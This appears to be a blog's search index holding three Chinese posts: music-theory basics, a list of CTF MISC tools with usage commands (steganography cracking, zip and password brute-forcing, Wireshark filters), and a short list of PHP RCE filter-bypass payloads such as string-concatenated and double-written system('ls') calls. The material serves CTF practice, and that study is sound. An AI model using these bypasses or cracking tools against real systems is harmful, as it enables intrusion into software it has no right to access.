<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>乐理笔记01-基础知识</title>
    <link href="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="乐音与噪音"><a href="#乐音与噪音" class="headerlink" title="乐音与噪音"></a>乐音与噪音</h3><p>乐音：音高（频率）固定，振动规则的音。钢琴等乐器发出的是乐音，听起来悦耳、柔和。<br>噪音：振动不规则，音高也不明显的音。风声、雨声、机器轰鸣声是噪音，大多数打击乐器（鼓、镲、沙锤等）发出的是噪音，听起来刺耳。</p><h3 id="音的物理性质"><a href="#音的物理性质" class="headerlink" title="音的物理性质"></a>音的物理性质</h3><p>音高：指音调的高低。由音的频率决定，频率是发音体在单位时间内的振动次数。<br>音值：指音的持续时间。<br>音强：指音的响度。由发音体的振幅大小决定。<br>音色：指不同声音表现在波形方面的与众不同的特性。音色与发音体的材料、结构等有关。</p><h3 id="唱名"><a href="#唱名" class="headerlink" title="唱名"></a>唱名</h3><p>用来唱的名字，也就是do,re,mi,fa,sol,la,si。在简谱上对应1,2,3,4,5,6,7。</p><h3 id="音名"><a href="#音名" class="headerlink" title="音名"></a>音名</h3><p>即声音的名字，声音是物体振动产生的，不同的声音会有不同的振动频率，而同一个声音的振动频率是固定的。因此同一个音名的频率不会改变，永远对应同一个音。</p><h4 id="钢琴键与音名"><a href="#钢琴键与音名" class="headerlink" title="钢琴键与音名"></a>钢琴键与音名</h4><p>钢琴一共有88个键<del>（因此钢琴有时被戏称为88k音游）</del>。按键的分布有周期性的规律，可以划分为若干组，取出其中一组如下图所示，一共有12个键，包括7个白键和5个黑键。7个白键的音名就分别为C,D,E,F,G,A,B。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1_%E6%99%AE%E9%80%9A%E9%92%A2%E7%90%B4%E9%94%AE+%E9%9F%B3%E5%90%8D.png"><img src="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1_%E6%99%AE%E9%80%9A%E9%92%A2%E7%90%B4%E9%94%AE+%E9%9F%B3%E5%90%8D.png" alt="img"></a></p><p>​图1 钢琴键与音名</p><h3 id="调号"><a href="#调号" class="headerlink" title="调号"></a>调号</h3><p>唱名对应的音名不是固定的，同一个唱名不一定对应同一个音名。唱名与音名的对应关系取决于<strong>调号</strong>。<br>调号的格式为“唱名&#x3D;音名”，简谱采用首调唱名法，如1&#x3D;C表示的是C大调，即唱名do对应音名C，以此类推唱名re,mi,fa,sol,la,si分别对应音名D,E,F,G,A,B。而1&#x3D;D则表示是D大调，此时唱名do对应音名D。</p><h3 id="首调与固定调"><a href="#首调与固定调" class="headerlink" title="首调与固定调"></a>首调与固定调</h3><p>首调唱名法：将大调中的主音唱为do，如C大调中将C唱为do，D大调中就将D唱为do。简谱通常使用首调。<br>固定调唱名法：在任何调式中，都将C4（中央C）唱为do，其他音以此类推。五线谱通常使用固定调。</p><h3 id="半音与全音"><a href="#半音与全音" class="headerlink" title="半音与全音"></a>半音与全音</h3><p>观察图1所示的一组钢琴键，不难发现C到D、D到E、F到G、G到A、A到B间都有黑键，而E到F间与B到C间没有黑键。也就是说E到F与B到C是直接相邻的，便可以称E到F、B到C间的音高距离为一个<strong>半音</strong>。<br>半音指的是相邻的两个音间的距离，而全音距离是半音的两倍。C到D、D到E、F到G、G到A、A到B间的音高距离为一个<strong>全音</strong>。<br>C到♯C、♯C到D的距离是一个半音。</p><h3 id="升降号"><a href="#升降号" class="headerlink" title="升降号"></a>升降号</h3><p>♯为升号，表示升一个半音；♭为降号，表示降一个半音。<br>𝄪为重升号，表示升一个全音；𝄫为重降号，表示降一个全音。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2_%E6%99%AE%E9%80%9A%E9%92%A2%E7%90%B4%E9%94%AE+%E5%8D%87%E9%99%8D.png"><img src="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2_%E6%99%AE%E9%80%9A%E9%92%A2%E7%90%B4%E9%94%AE+%E5%8D%87%E9%99%8D.png" alt="img"></a></p><p>图2 钢琴键与带升降号音名</p><p>加上升降符号后的一组钢琴键如上图所示，可以发现同一个键可以用不同的音名表示出来，而实际上这些音是同一个音，只是写法不同，这些对应同一个音的不同音名被称作<strong>等音</strong>。至于使用哪个音名，这取决于所处的音乐语境。</p><h3 id="音的分组"><a href="#音的分组" class="headerlink" title="音的分组"></a>音的分组</h3><p>对完整的88键钢琴进行分组，共分为9组，如下图所示：</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3_%E5%AE%8C%E6%95%B4%E9%92%A2%E7%90%B4%E9%94%AE.png"><img src="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3_%E5%AE%8C%E6%95%B4%E9%92%A2%E7%90%B4%E9%94%AE.png" alt="img"></a>图3 钢琴键的分组</p><h4 id="霍尔赫姆兹音调记号法"><a href="#霍尔赫姆兹音调记号法" class="headerlink" title="霍尔赫姆兹音调记号法"></a>霍尔赫姆兹音调记号法</h4><p>命名分大字组、小字组、大字N组与小字N组。<br>大字组&#x2F;大字N组的音名大写，小字组&#x2F;小字N组的音名小写；<br>大字N组音名右下角写N，小子N组音名右上角写N。</p><h4 id="科学音调记号法"><a href="#科学音调记号法" class="headerlink" title="科学音调记号法"></a>科学音调记号法</h4><p>将9个组从左至右命名为0到8。直接记为“大写音名+数字”的形式。<br>例如小字一组的C可以按霍法记为c1c1，也可按科法记为C4。</p><h3 id="中央C与标准音"><a href="#中央C与标准音" class="headerlink" title="中央C与标准音"></a>中央C与标准音</h3><p>小字一组的C（即C4）被称作<strong>中央C</strong>。<br>小字一组的A（即A4）被称作<strong>标准音</strong>，其频率确定为440Hz。</p><h3 id="音域"><a href="#音域" class="headerlink" title="音域"></a>音域</h3><p>乐器能够发出的声音范围，对于钢琴来说是A2A2到c5c5。<br>人声的音域通常情况下为gg到d2d2，正好覆盖小字一组，因此对于简谱中的“1&#x3D;C”，其中的C对应钢琴中小字一组的C（中央C）。</p><h3 id="高音点与低音点"><a href="#高音点与低音点" class="headerlink" title="高音点与低音点"></a>高音点与低音点</h3><p>1&#x3D;C时，以小字一组为基准，小字一组的CDEFGAB对应简谱1234567。小字二组对应简谱加一个高音点，即1˙2˙3˙4˙5˙6˙7˙1˙2˙3˙4˙5˙6˙7˙，小字三组对应简谱则加两个高音点，以此类推。大字组对应简谱加一个低音点，即<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E4%BD%8E%E9%9F%B3%E7%82%B9.gif"><img src="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E4%BD%8E%E9%9F%B3%E7%82%B9.gif" alt="img"></a>，大字一组对应简谱则加两个低音点，以此类推。</p><h3 id="纯八度"><a href="#纯八度" class="headerlink" title="纯八度"></a>纯八度</h3><p>纯八度是音程的一种，指相邻音组中相同音名的两个音之间的音高距离。纯八度的两个音（如C3与C4），其频率比正好为1:2。当两个音的振动频率比接近简单整数时，两个音听起来会很相近，很协和，感觉像同一个音。</p><h3 id="调式"><a href="#调式" class="headerlink" title="调式"></a>调式</h3><p>若干高低不同的乐音，围绕某一有稳定感的中心音，按一定的音程关系组织在一起，成为一个有机的体系，称为调式。<br>调式有很多种，包括大调式、小调式、中古调式、五声调式等。<br>自然大调是大调式的一种，当七个音按照“全全半全全全半”的规则排列时，构成的是自然大调。<br>简谱中“1&#x3D;C”表示的是C大调，CDEFGAB间的音高距离符合“全全半全全全半”的规则，是自然大调的一种。此外有D大调、E大调等。</p><h3 id="音阶"><a href="#音阶" class="headerlink" title="音阶"></a>音阶</h3><p>将调式中的所有音，以主音开始到主音结束，由低到高或由高到低以阶梯状排列起来，被称作音阶。<br>如C大调的音阶就可以表示为“CDEFGABC”，这里最后面的C比最前面的C高了一个八度。此外“CBAGFEDC”、“CDEFGABCBAGFEDC”、“CBAGFEDCDEFGAB”也可称作C大调的音阶。</p><p>表1 自然大调音阶一览表</p><table><thead><tr><th>1&#x3D;C</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>A</th><th>B</th><th>C</th></tr></thead><tbody><tr><td>1&#x3D;♯C(第一个黑键)</td><td>♯C</td><td>♯D</td><td>♯E</td><td>♯F</td><td>♯G</td><td>♯A</td><td>♯B</td><td>♯C</td></tr><tr><td>1&#x3D;♭D(第一个黑键)</td><td>♭D</td><td>♭E</td><td>F</td><td>♭G</td><td>♭A</td><td>♭B</td><td>C</td><td>♭D</td></tr><tr><td>1&#x3D;D</td><td>D</td><td>E</td><td>♯F</td><td>G</td><td>A</td><td>B</td><td>♯C</td><td>D</td></tr><tr><td>1&#x3D;♭E(第二个黑键)</td><td>♭E</td><td>F</td><td>G</td><td>♭A</td><td>♭B</td><td>C</td><td>D</td><td>♭E</td></tr><tr><td>1&#x3D;E</td><td>E</td><td>♯F</td><td>♯G</td><td>A</td><td>B</td><td>♯C</td><td>♯D</td><td>E</td></tr><tr><td>1&#x3D;F</td><td>F</td><td>G</td><td>A</td><td>♭B</td><td>C</td><td>D</td><td>E</td><td>F</td></tr><tr><td>1&#x3D;♯F(第三个黑键)</td><td>♯F</td><td>♯G</td><td>♯A</td><td>B</td><td>♯C</td><td>♯D</td><td>♯E</td><td>♯F</td></tr><tr><td>1&#x3D;♭G(第三个黑键)</td><td>♭G</td><td>♭A</td><td>♭B</td><td>♭C</td><td>♭D</td><td>♭E</td><td>F</td><td>♭G</td></tr><tr><td>1&#x3D;G</td><td>G</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>♯F</td><td>G</td></tr><tr><td>1&#x3D;♭A(第四个黑键)</td><td>♭A</td><td>♭B</td><td>C</td><td>♭D</td><td>♭E</td><td>F</td><td>G</td><td>♭A</td></tr><tr><td>1&#x3D;A</td><td>A</td><td>B</td><td>♯C</td><td>D</td><td>E</td><td>♯F</td><td>♯G</td><td>A</td></tr><tr><td>1&#x3D;♭B(第五个黑键)</td><td>♭B</td><td>C</td><td>D</td><td>♭E</td><td>F</td><td>G</td><td>A</td><td>♭B</td></tr><tr><td>1&#x3D;B(第七个白键)</td><td>B</td><td>♯C</td><td>♯D</td><td>E</td><td>♯F</td><td>♯G</td><td>♯A</td><td>B</td></tr><tr><td>1&#x3D;♭C(第七个白键)</td><td>♭C</td><td>♭D</td><td>♭E</td><td>♭F</td><td>♭G</td><td>♭A</td><td>♭B</td><td>♭C</td></tr></tbody></table><p>自然大调的所有音阶如上表所示，一共有十五个大调，对应十二个音。其中第一个黑键上的“1&#x3D;♯C”与“1&#x3D;♭D”、第一个黑键上的“1&#x3D;♯F”与“1&#x3D;♭G”、第七个白键上的“1&#x3D;B”与“1&#x3D;♭C”是等音调，调式中的所有音完全相同，只是音名不同。<br>为了方便起见，大调中的音名最好不要含有重升重降符号，第二个黑键上的“1&#x3D;♯D”、第四个黑键上的“1&#x3D;♯G”、第五个黑键上的“1&#x3D;♯A”其大调内音名含有重升符号，不符合方便的原则，因此没有列在上表中。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钢琴</tag>
      
      <tag>乐理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF MISC常用工具集锦/使用方法简介</title>
    <link href="/2024/11/09/CTF-MISC%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%E9%94%A6-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/"/>
    <url>/2024/11/09/CTF-MISC%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%E9%94%A6-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-MISC常用工具集锦-使用方法简介"><a href="#CTF-MISC常用工具集锦-使用方法简介" class="headerlink" title="CTF MISC常用工具集锦&#x2F;使用方法简介"></a>CTF MISC常用工具集锦&#x2F;使用方法简介</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>MISC题型多变而且工具繁杂，因此自己花时间整理了一份工具列表，以便日后参考用</p><p><strong>流畅地阅读这篇博客，你可能需要：</strong></p><ul><li>Python2.7.18 + Python3.8 + 任何一个更高版本的Python，使用conda管理</li><li>Linux虚拟机，kali即可</li><li>流畅访问Google&#x2F;GitHub等站点的网络</li></ul><h2 id="通用工具"><a href="#通用工具" class="headerlink" title="通用工具"></a>通用工具</h2><h3 id="PuzzleSolver"><a href="#PuzzleSolver" class="headerlink" title="PuzzleSolver"></a>PuzzleSolver</h3><p>专为misc手打造的瑞士军刀(?)，整合了多种脚本（base，字频分析，png&#x2F;bmp自动修复文件头，图片盲水印等等）的带GUI的工具 仓库：<a href="https://github.com/Byxs20/PuzzleSolver">Github - PuzzleSolver</a></p><h3 id="随波逐流-CTF编码工具"><a href="#随波逐流-CTF编码工具" class="headerlink" title="[随波逐流]CTF编码工具"></a>[随波逐流]CTF编码工具</h3><p>集成了绝大部分编码的解码&#x2F;转换工具，有一键解码功能，简单题直接一把梭 <a href="http://www.1o1o.xyz/index.html">官网</a></p><h3 id="010-Editor"><a href="#010-Editor" class="headerlink" title="010 Editor"></a>010 Editor</h3><p>功能强大的十六进制编辑工具，有文件模板功能，便于修改各种缺失文件头文件尾。</p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>一个分析文件并提取嵌入的文件和代码的工具，可以判断源文件中包含的隐藏文件种类 仓库：<a href="https://github.com/ReFirmLabs/binwalk">Github - binwalk</a> 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -e stego.zip        <span class="hljs-comment">#提取stego.zip</span><br></code></pre></td></tr></table></figure><h3 id="steghide-stegseek"><a href="#steghide-stegseek" class="headerlink" title="steghide&#x2F;stegseek"></a>steghide&#x2F;stegseek</h3><p>steghide隐写和配套解密工具，配合rockyou.txt食用更佳 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">stegseek [stegofile.jpg] [wordlist.txt]        <span class="hljs-comment">#用wordlist暴力破解stegofile</span><br>stegseek --seed [stegofile.jpg]        <span class="hljs-comment"># 分析此文件是否包含steghide内容，包含多少隐藏内容，是如何加密的</span><br></code></pre></td></tr></table></figure><h3 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h3><p>赛博厨子，ctf编码神器，方便易用，可以下载本地离线使用 链接：<a href="https://cyberchef.org/">官网</a></p><h3 id="Ciphey"><a href="#Ciphey" class="headerlink" title="Ciphey"></a>Ciphey</h3><p>一个功能强大的ai全自动解密工具，输入密文后自动返回解密文本并指出加密方式（虽然不能百分百解出，但有时候试试会有奇效） 仓库：<a href="https://github.com/Ciphey/Ciphey">Github - Ciphet</a> 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ciphey -t <span class="hljs-string">&quot;put_encrypted_message_here&quot;</span><br>ciphey -f encrypted_message.txt<br><span class="hljs-comment"># 加上-q 直接给出结果</span><br><span class="hljs-comment"># 加上-g 只输出答案</span><br></code></pre></td></tr></table></figure><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h3><p>常用于LSB隐写分析&#x2F;内容提取、GIF查看单帧</p><h3 id="SilentEye"><a href="#SilentEye" class="headerlink" title="SilentEye"></a>SilentEye</h3><p>分析bmp&#x2F;wav中的隐写</p><h3 id="OurSecret"><a href="#OurSecret" class="headerlink" title="OurSecret"></a>OurSecret</h3><p>带密码的jpg隐写工具</p><h3 id="Acropalypse-Multi-Tool"><a href="#Acropalypse-Multi-Tool" class="headerlink" title="Acropalypse-Multi-Tool"></a>Acropalypse-Multi-Tool</h3><p>一个基于CVE-2023-28303和CVE-2023-21036漏洞的工具，可用于恢复截图被裁剪掉的部分数据 仓库：<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">Github - Acropalypse Multi Tool</a></p><h3 id="QR-Research"><a href="#QR-Research" class="headerlink" title="QR Research"></a>QR Research</h3><p>二维码识别&#x2F;补全软件，支持各种纠错等级和二维码种类</p><h3 id="QrScan"><a href="#QrScan" class="headerlink" title="QrScan"></a>QrScan</h3><p>另一个二维码识别软件，特点是能批量识别并输出到csv文件中 仓库：<a href="https://github.com/zfb132/QrScan">Github - QrScan</a></p><h3 id="ImageMagick-gaps"><a href="#ImageMagick-gaps" class="headerlink" title="ImageMagick&#x2F;gaps"></a>ImageMagick&#x2F;gaps</h3><p>多功能图像处理工具，多用于拼图，先用ImageMagick把打乱的图像拼接，再使用gaps识别并自动整理 链接（ImageMagick）：<a href="https://github.com/ImageMagick/ImageMagick">Github - ImageMagick</a> &amp; <a href="https://imagemagick.org/">官网</a> 链接（gaps）：<a href="https://github.com/nemanja-m/gaps">Github - gaps</a> 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">magick.exe montage *.jpg  -tile 22x2  -geometry 64x256+0+0 abc.jpg<br><span class="hljs-comment"># 将目录里的jpg文件按顺序拼成x轴22块，y轴2块的图 ，每个图块的大小为64X512像素，输出文件为abc.jpg</span><br><br>gaps run --image=img.png --size=xxx --save<br><span class="hljs-comment"># size填拼图各块的长宽</span><br><span class="hljs-comment"># 额外参数：</span><br>–generations <span class="hljs-comment"># 遗传算法迭代次数，效果不好时适当改变</span><br>–population <span class="hljs-comment"># 个体数量</span><br></code></pre></td></tr></table></figure><h2 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写"></a>文件隐写</h2><h3 id="wbs4-3open"><a href="#wbs4-3open" class="headerlink" title="wbs4.3open"></a>wbs4.3open</h3><p>带密码的pdf隐写工具</p><h3 id="AOPR-Forensic-Edition"><a href="#AOPR-Forensic-Edition" class="headerlink" title="AOPR Forensic Edition"></a>AOPR Forensic Edition</h3><p>文档密码破解工具，支持暴力、字典、掩码等，可利用VBA后门 一个可用的学习版链接：<a href="https://bbs.pcbeta.com/viewthread-1964941-1-1.html">pcbeta</a></p><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><p>开源的音频编辑软件，可以可视化查看频谱、音轨，便于找出音频中的分析点</p><h3 id="DeepSound-2-0"><a href="#DeepSound-2-0" class="headerlink" title="DeepSound 2.0"></a>DeepSound 2.0</h3><p>带密码的wav隐写分析工具</p><h3 id="RX-SSTV"><a href="#RX-SSTV" class="headerlink" title="RX-SSTV"></a>RX-SSTV</h3><p>一个sstv识别工具，可将声音信息转为图像</p><h3 id="QSSTV"><a href="#QSSTV" class="headerlink" title="QSSTV"></a>QSSTV</h3><p>linux上的sstv接收软件，特点是可以直接读取wav音频文件里的信息，免去了外放的困扰 仓库：<a href="https://github.com/ON4QZ/QSSTV">Github - QSSTV</a></p><h3 id="mp3stego"><a href="#mp3stego" class="headerlink" title="mp3stego"></a>mp3stego</h3><p>正如其名，是一个命令行mp3隐写分析工具 链接：<a href="https://www.petitcolas.net/steganography/mp3stego/">mp3stego</a></p><h2 id="压缩包分析"><a href="#压缩包分析" class="headerlink" title="压缩包分析"></a>压缩包分析</h2><h3 id="ZipCenOp"><a href="#ZipCenOp" class="headerlink" title="ZipCenOp"></a>ZipCenOp</h3><p>zip伪加密修复 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ZipCenOp.jar r fake_encrypted.zip<br></code></pre></td></tr></table></figure><h3 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h3><p>暴力破解工具，支持掩码、字典、明文攻击等手段</p><h3 id="bkcrack"><a href="#bkcrack" class="headerlink" title="bkcrack"></a>bkcrack</h3><p>zip明文攻击工具，和ARCHPR相比支持更多的参数 条件：1.ZipCrypto加密方式 2.已知其中某个完整的明文文件&#x2F;已知明文的至少12个字节和偏移（其中又至少8字节要连续）</p><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><p>宇宙最强密码&#x2F;哈希破解工具，支持多种系统，cpu&#x2F;gpu&#x2F;apu计算，支持多种hash算法，可破解rar、office文档、pdf等文件。</p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h3><p>抓包流量分析软件 快速入门：</p><h4 id="mac地址-ip-端口过滤"><a href="#mac地址-ip-端口过滤" class="headerlink" title="mac地址&#x2F;ip&#x2F;端口过滤"></a>mac地址&#x2F;ip&#x2F;端口过滤</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir">eth.addr==<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span>   //筛选<span class="hljs-title class_">MAC</span>地址是<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span>的数据包，包括源或者目的<span class="hljs-title class_">MAC</span>地址<br>eth.src==<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span>    //源<span class="hljs-title class_">MAC</span>地址是<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span><br>eth.dst==<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span>    //目的<span class="hljs-title class_">MAC</span>地址是<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span><br><br>ip.addr==<span class="hljs-number">192.168</span>.<span class="hljs-number">1.122</span>        //筛选出<span class="hljs-title class_">IP</span>地址是<span class="hljs-number">192.168</span>.<span class="hljs-number">1.122</span>的数据包，包括源<span class="hljs-title class_">IP</span>地址或者目的<span class="hljs-title class_">IP</span>地址<br>ip.src== 和ip.dst==同上<br><br>tcp.port==<span class="hljs-number">80</span>         //根据<span class="hljs-title class_">TCP</span>端口筛选数据包，包括源端口或者目的端口<br>tcp.dstport==<span class="hljs-number">80</span>        //根据目的<span class="hljs-title class_">TCP</span>端口筛选<br>tcp.srcport==<span class="hljs-number">80</span>        //根据源<span class="hljs-title class_">TCP</span>端口筛选<br>udp.port==<span class="hljs-number">4010</span>       //根据<span class="hljs-title class_">UDP</span>端口筛选数据包，包括源端口或者目的端口<br>udp.srcport==<span class="hljs-number">4010</span>      //根据源<span class="hljs-title class_">UDP</span>端口筛选<br>udp.dstport==<span class="hljs-number">4010</span>      //根据目的<span class="hljs-title class_">UDP</span>端口筛选<br></code></pre></td></tr></table></figure><h4 id="协议筛选"><a href="#协议筛选" class="headerlink" title="协议筛选"></a>协议筛选</h4><p>常见协议：udp，tcp，arp，icmp，smtp，pop，dns，ip，ssl，http，ftp，ssh</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http <span class="hljs-comment">//过滤http流量</span><br>http<span class="hljs-selector-class">.request</span>.method==GET/POST<br>http<span class="hljs-selector-class">.response</span><br>http<span class="hljs-selector-class">.response</span><span class="hljs-selector-class">.code</span> &gt;=<span class="hljs-number">400</span>（包含错误码）<br>http<span class="hljs-selector-class">.response</span><span class="hljs-selector-class">.phrase</span> == “OK”（过滤响应中的phrase）<br>http contains <span class="hljs-string">&quot;snapshot&quot;</span> <span class="hljs-comment">//过滤http头中含有指定字符</span><br>http<span class="hljs-selector-class">.server</span> contains “snapshot” <span class="hljs-comment">//过滤http头中server字段含有指定字符</span><br>http<span class="hljs-selector-class">.content_type</span> == “text/html” <span class="hljs-comment">//过滤content_type是text/html的http响应、post包</span><br>http<span class="hljs-selector-class">.content_encoding</span> == “gzip” <span class="hljs-comment">//过滤content_encoding是gzip的http包</span><br>http<span class="hljs-selector-class">.transfer_encoding</span> == “chunked” <span class="hljs-comment">//根据transfer_encoding过滤</span><br>http<span class="hljs-selector-class">.content_length</span> == <span class="hljs-number">279</span><br>http<span class="hljs-selector-class">.content_length_header</span> == “<span class="hljs-number">279</span>” <span class="hljs-comment">//根据content_length的数值过滤</span><br>http<span class="hljs-selector-class">.server</span> <span class="hljs-comment">//过滤所有含有http头中含有server字段的数据包</span><br></code></pre></td></tr></table></figure><p>也可参考：<a href="https://zhuanlan.zhihu.com/p/631821119">知乎 - Wireshark教程</a></p><h2 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC^2"></a>MISC^2</h2><h3 id="ntfsstreamseditor"><a href="#ntfsstreamseditor" class="headerlink" title="ntfsstreamseditor"></a>ntfsstreamseditor</h3><p>NTFS数据流隐写</p><h3 id="veracrypt"><a href="#veracrypt" class="headerlink" title="veracrypt"></a>veracrypt</h3><p>磁盘加密软件，可建立虚拟磁盘并利用密码或者密钥文件进行加密，支持各种加密算法</p><h3 id="Cheat-Engine"><a href="#Cheat-Engine" class="headerlink" title="Cheat Engine"></a>Cheat Engine</h3><p>功能如其名，做一些游戏题的时候可以用这个走走捷径。 <em>不要和带反作弊的游戏一起开</em></p><h3 id="bruteHASH"><a href="#bruteHASH" class="headerlink" title="bruteHASH"></a>bruteHASH</h3><p>穷举指定格式的数据的HASH值，格式可以为：</p><ul><li>指定明文格式</li><li>不限定明文格式随机字符穷举</li><li>自定义穷举字符集</li><li>CTF 常见 HASH(MD4&#x2F;MD5&#x2F;SHA1)</li><li>设置 HASH 开头、结尾或包含字符串</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>杂项</tag>
      
      <tag>工具收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>REC绕过技巧收集</title>
    <link href="/2024/11/05/REC%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E6%94%B6%E9%9B%86/"/>
    <url>/2024/11/05/REC%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><blockquote><p>字符串拼接绕过 (“syste”.”m”)(“ls”);</p><p>双写绕过    syssystemtem(“ls”);</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>rce绕过</tag>
